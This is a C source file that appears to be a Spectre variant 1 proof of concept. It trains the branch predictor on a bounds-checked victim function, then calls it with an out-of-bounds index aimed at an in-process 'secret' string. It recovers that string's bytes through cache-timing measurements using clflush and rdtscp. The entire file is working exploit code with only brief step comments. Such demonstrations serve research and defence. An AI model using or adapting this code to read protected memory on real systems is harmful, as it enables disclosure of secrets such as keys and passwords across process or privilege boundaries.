#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <x86intrin.h>

#define ATTEMPTS 10000
#define TRAINING_ROUNDS 30
#define THRESHOLD 150

unsigned int array1_size = 16;

struct data
{
    uint8_t array1[16];
    uint8_t padding[16];
    char secret[32];
};

struct data d = {
    .array1 = {
        1, 2, 3, 4, 5, 6, 7, 8,
        9, 10, 11, 12, 13, 14, 15, 16},
    .secret = "SensitiveData!"};

uint8_t array2[256 * 512];

volatile uint8_t temp = 0;

__attribute__((noinline)) void victim(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[d.array1[x] * 512];
    }
}

static inline uint64_t time_access(volatile uint8_t *addr)
{
    unsigned aux;
    uint64_t start, end;

    _mm_mfence();
    _mm_lfence();

    start = __rdtscp(&aux);
    _mm_lfence();

    (void)*addr;

    _mm_lfence();
    end = __rdtscp(&aux);

    _mm_lfence();
    _mm_mfence();

    return end - start;
}

static void flush_array2(void)
{
    for (int i = 0; i < 256; i++)
        _mm_clflush(&array2[i * 512]);

    _mm_mfence();
}

int main(void)
{
    /* Initialize probe array */
    for (int i = 0; i < sizeof(array2); i++)
        array2[i] = 1;

    size_t malicious_x = offsetof(struct data, secret);

    printf("array1       = %p\n", (void *)d.array1);
    printf("secret       = %p\n", (void *)d.secret);
    printf("malicious x  = %zu\n\n", malicious_x);

    int hits[256] = {0};

    for (int attempt = 0; attempt < ATTEMPTS; attempt++)
    {

        flush_array2();

        /* Train */
        for (int training = 0; training < TRAINING_ROUNDS; training++)
        {
            victim(training % array1_size);
        }

        // Remove cache effects caused by training
        for (int i = 0; i <= 23; i++)
            _mm_clflush(&array2[i * 512]);

        _mm_mfence();
        flush_array2();

        /* Slow down the bounds check */
        _mm_clflush(&array1_size);

        /* Attack */
        victim(malicious_x);

        // Remove cache effects caused by training
        for (int i = 0; i <= 23; i++)
            _mm_clflush(&array2[i * 512]);

        /* Probe */
        for (int j = 0; j < 256; j++)
        {

            int i = (j * 167 + 13) & 255;

            uint64_t t = time_access(&array2[i * 512]);

            if (t < THRESHOLD)
                hits[i]++;
        }
    }

    /*
     * Print accumulated results.
     */
    printf("Cache hits after %d attempts:\n\n", ATTEMPTS);

    for (int i = 0; i < 256; i++)
    {

        if (hits[i] > 0)
        {

            printf("value %3d ('%c') : %d hits\n",
                   i,
                   (i >= 32 && i <= 126) ? i : '.',
                   hits[i]);
        }
    }

    return 0;
}